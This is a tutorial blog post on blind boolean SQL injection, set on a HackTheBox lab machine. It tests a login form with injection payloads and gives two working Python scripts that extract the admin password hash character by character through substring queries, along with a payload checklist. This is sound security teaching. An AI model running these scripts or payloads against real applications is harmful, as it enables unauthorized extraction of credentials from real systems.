---
title: SQL Injection 0x03 - Blind Boolean Attacks
date: 2020-07-18 14:37:47
tags: [sqli, sql injeciton, web attacks]
---


# SQL Injection 0x03 - Blind Boolean Attacks

## Introduction
Blind SQL injection are the type of SQL injections attacks wherein no database error is received from the web responses, there are either subtle or no changes to the web page upon sending injection payloads. Since these changes are either subtle or non-existent, it becomes harder to identify and exploit these vulnerabilities but are certainly not impossible.

Hi, welcome to the third part of the SQL injection series, if you haven't read the first two posts and are a complete beginner I'd suggest you read them first - [SQL Injection 0x01 - Introduction](/sqli-0x01) and [SQL Injection 0x02 - Testing & UNION Attacks](/sqli-0x02). In this blog post I have covered blind boolean SQL injection attacks, as the title suggests, in which you receive subtle changes in the responses suggesting if the vulnerability is present, and if an injection payload is working or not.

For this post I decided to use [Falafel](https://app.hackthebox.eu/machines/124) machine from [HackTheBox](https://app.hackthebox.eu/getting-started) platform as the example to explain blind boolean SQL injection. If you would like to follow along and then finally hack the machine, I've posted the writeup [here](/HackTheBox/htb-falafel-writeup-w-o-metasploit) 

I will start from identification of interactable fields, test these fields, and then completely exploit it using different methods (BurpSuite Intruder and Custom Python Script)

## Identification

After going through application, `/login.php` was the only endpoint with which a user can interact, and with a database.

Sending `admin : hasd`

![Wrong Identification](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png)

Looks like "admin" user is present but it tells you if the password is wrong.

Let's send in a non-existent user to confirm our assumption.
Sending `noobsec : hasd`

![Try Again](/sqli-0x03/0_nouser.png)

We can definitely do user enumeration.

## Testing
We'll start with testing now.

### Single-quote Test

Testing with a single-quote (`'`) first.
Sending `admin' : hasd`

![Try Again](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login2.png)

We get an error - *Try again..*. Looks like we broke the internal query.

### Comment Test

Next we will test with a comment (`-- -`).
Sending `admin--+- : hasd`

![Try Again](/sqli-0x03/4_comment.png)

We get an error - *Try again..*. Looks like we broke the internal query.

#### Single-quote And Comment Test

Let's test a single-quote and a comment. We'll append the username with a single-quote and then a comment, and see if that changes anything.

Sending `admin'--+- : hasd`

![Wrong Identification](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png)

We get the wrong password error - *Wrong identification : admin*. With this we can say that we have an sql injection on our hand, but let's finish our testing.

### OR Test

We will now test with an operand - `OR`.
Sending `admin'+OR+'1'='1'--+- : hasd` :

![Wrong Identification](/sqli-0x03/1_or.png)

We get the wrong password error - *Wrong identification : admin*. With this we can again say that we have an sql injection on our hand, but let's finish rest of our testing.

Let's test `OR` with a non-existent user.
Sending `noobsec'+OR+'1'='1'--+- : hasd` :

![Wrong Identification](/sqli-0x03/1_or2.png)

Even when we send in a wrong username, we get the wrong password error for admin due to our `OR` injection test, indicating that the injection is definitely working here.

### AND Test

Now let's test the field with `AND` operator.
Sending `admin'+AND+'1'='1'--+- : hasd`

![Wrong Identification](/sqli-0x03/2_and1.png)

We get the wrong password error - *Wrong identification : admin*, great.

Let's test by sending a `false` condition.
Sending `admin'+AND+'1'='2'--+- : hasd`

![Try Again](/sqli-0x03/2_and2.png)

We get the error - *Try again*, even though the username was correct, once again confirming that we have sql injection on this field.

### Sleep Test

Let's conclude our testing with the `sleep()` test.
Sending `admin'+OR+sleep(20)--+- : hasd`

![Hacking Attempt Detected](/sqli-0x03/3_sleep.png)

Not only did this not work, it turns out that there is some filter in place in order to prevent malicious users to hack this authentication mechanism. Clearly, it's been working out just fine :)

## Exploitation

Next step would be get the number of columns, but UNION is blocked regardless of what you do or try any kind of bypass. We could use ORDER BY to get the number of columns but clearly this is not an error-based SQL injection. Since we cannot use UNION, getting the number of columns does not make sense.

Although we cannot dump credentials out on the screen, it does not mean we cannot extract data out.

Since this is a SQL database, we could use *substring* - `substring(string, position, length)` function. As the name suggests, substring function takes a "string", or a column (like in this case), along with position, and length, and prints out the characters of a string (or column) from the position and length you specify.

Let's test it with the username field to get a gist, since we know that the user "admin" exist

!["Right" Error](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub1.png)

It's important to keep in mind that when our SQL injection is working, we get the error "Wrong identification", and when it does not, we get an error "Try again".

Similarly, we can extract the hashes of the users present in this website.

We'll test for [a-f0-9] (because hashes) for each character position for the password column, and if we get the error "Wrong identification", then it would indicate that for position X the password column has that character.

### Hash Extraction - BurpSuite Edition

This can be done in BurpSuite Intruder, even in Community Edition which is what I use, let's take a look at finding the first character of the admin's hash.

First we select a login request in BurpSuite and "Send it to intruder" and set our payload position:

![Setting Payload Position](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp1.png)

Next step to set a payload, we'll select Brute Forcer. Modify the character set, as below:

![Setting Payload](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp2.png)

To make our life easier, we could put the "right" error string in the "Grep Match" section so that the request that matches as per our error will get marked.

![Grepping Error](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp3.png)

We're now ready to "Start Attack"ing. Once we do, we soon find that the first character of the admins' hash is zero (0). We can now pause the attack since we already got what we needed from this injection.

![Getting The First Character](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp4.png)

We were successfully able to leverage BurpSuite Intruder to extract the first character of admins' hash and can see that it is "0" (Zero).

### Hash Extraction - Python Edition

*Note: Link to the scripts are at the bottom*

Although that was nice and we could perform a little more tweaking and get the entire hash, it would be a whole LOT faster if we whipped up a script of our own and got this done, which is what we will be doing now.

I wrote the script in python to get the admin's hash.

``` python
# Importing necessary library
import requests

# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function
def SQLpayload(i,c):
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


# All the characters in a hash
characters = 'abcdef0123456789'

# "hash" comes as highlighted on python and I did not wanna mess with something I didn't know
# so I'm using "password" to store the hash lol
password = '' # Blank hash string

# Loop through every index position : 1 to 32
for i in range(1,33):
# Loop through every character in the "characters" for each index position
    for c in characters:
    # Defining a payload to be sent to the server
        payload = {'username':SQLpayload(i,c), 'password':'noobsec'}
        # Sending a post request with the above payload and it's data and response is saved in "r"
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        # Checking if "right" error is hit at an index for a character
        if "Wrong identification" in r.text:
        # If right error is hit, append the character to the password string
            password += c
            # Print the character on the screen without moving the cursor to a new line
            # Helps in knowing the script is actually working and you're not sitting there for a few minutes just to realize it is broken
            print(c,end='',flush=True)
            # No need to cycle through the rest of the characters if the "right" error is already hit for an index position
            break

# Print the hash
print('\nHash is:\t'+password+'\n')
```

Once we run the script we get the admin users' hash.

![Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto1.png)

Although this script works, it does take quite some time to run. So I created another script which would perform some extra queries to the database before it checks whether a particular range of characters are in users' hashs' X position or not.

The first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it's a hash, it'll always belong to a-f group which is "alpha1" in the below code.
If it's not an alphabet, it's checked if the number belongs to [0-4] group or [5-9].
Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.

These checks are done using "ord". Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it's greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.

| Numbers (dec hex ascii) | Alphabets (dec hex ascii) |
|-------------------|-------------------|
| ![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/13_ord1.png) | ![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/13_ord2.png) |

Check out `man ascii` to view the entire table.

``` python
import requests


def SQLstring(i,c):
    # We only want 1 password character at a time
    # Final payload will look like
    # username=admin'+AND+substring(password,1,1)='a'--+-&password=noobsec
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


def SQLsplit(i):
    # Checking if the character is an alphabet
    sql = "admin' AND ord(substring(password,%s,1)) > '58'-- -" % i
    payload = {'username':sql, 'password':'noobsec'}
    r = requests.post('http://10.10.10.73/login.php', data=payload)
    if "Wrong identification" in r.text:
    # Checking if it's beyond "f"
        sql = "admin' AND ord(substring(password,%s,1)) > '102'-- -" % i
        payload = {'username':sql, 'password':'noobsec'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "alpha2"
        else:
        # If not beyond "f"
            return "alpha1"
    # Character is a number
    else:
    # Checking if number is less than "5"
        sql = "admin' AND ord(substring(password,%s,1)) < '53'-- -" % i
        payload = {'username':sql, 'password':'noobsec'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "num1"
        else:
        # If number is greater than 5
            return "num2"


# password could be in hashed format or plaintext
alpha1 = 'abcdef'
alpha2 = 'ghijklmnopqrstuvwxyz'
num1 = '01234'
num2 = '56789'

# Password variable
passwd = ''

for i in range(1,33):
    if SQLsplit(i) == "alpha1":
        for a in alpha1:
            payload = {'username':SQLstring(i,a), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break

    elif SQLsplit(i) == "alpha2":
        for a in alpha2:
            payload = {'username':SQLstring(i,a), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break
            
    elif SQLsplit(i) == "num1":
        for n in num1:
            payload = {'username':SQLstring(i,n), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break

    
    else:
        for n in num2:
            payload = {'username':SQLstring(i,n), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php',data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break


# print('\n')
print('\nPassword or Hash is:\t'+passwd+'\n')
```

Running this script to get the admins' hash:

![Admins' Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto2.png)

By making a script with extra checks, it helped us save 38 seconds for just one account, if there were a lot of accounts in here that would add up to some considerable amount of time saved.

The above script is not perfect, maybe you could make it even more dynamic.

## Summary
To summarize this post:
1. Identify all the fields that a user can interact with
    1. Take a look at all the input fields
    2. Consider all the parameters being passed to the backend
    3. Consider HTTP headers like User-Agent and Cookies, when application looks like it's tracking a user
2. Test each point individually with different characters and conditions
3. Use functions like `substring` when UNION is not possible
4. When dealing with repetitive tasks, or a lot of data/ queries, use automation

**Testing Checklist**:

| Name | Character | Function |
| ------ | ----------- | ---------- |
| Single quote | `'` | String terminator |
| Semi colon | `;` | Query terminator
| Comment | `-- -` | Removing rest of the query |
| Single quote with a comment | `'-- -` | End a string and remove rest of the query |
| Single quote, semi colon and a comment | `';-- -` | End a string, end query, and remove rest of the query |
| OR operator | `OR 1=1-- -` | For integers, `true` test |
| OR operator | `OR 1=2-- -` | For integers, `false` test |
| OR operator | `' OR '1'='1'-- -` | For strings, `test` test |
| AND operator | `AND 1=1-- -` | For integers, `true` test |
| AND operator | `AND 1=2-- -` | For integers, `false` test |
| AND operator | `' AND '1'='1'-- -` | For strings, `true` test |
| Sleep function | `OR sleep(5)-- -` | Blind test |

**Blind boolean hack steps**:
1. Identify "right" and "wrong" errors.
2. Test if `substring` is working with the username column
3. Run a test round for the first position of the password column, which would be hash
4. Write a script to perform the same
5. Update the script to cycle through each character (a-f0-9) for 32 positions and print it out.

## Fin

Both the scripts are available in this [git repo](https://github.com/krnb/scripts).
If some part of it feels unexplained or you did not understand, feel free to contact me :)

Take care, have a great day, and keep hackin'!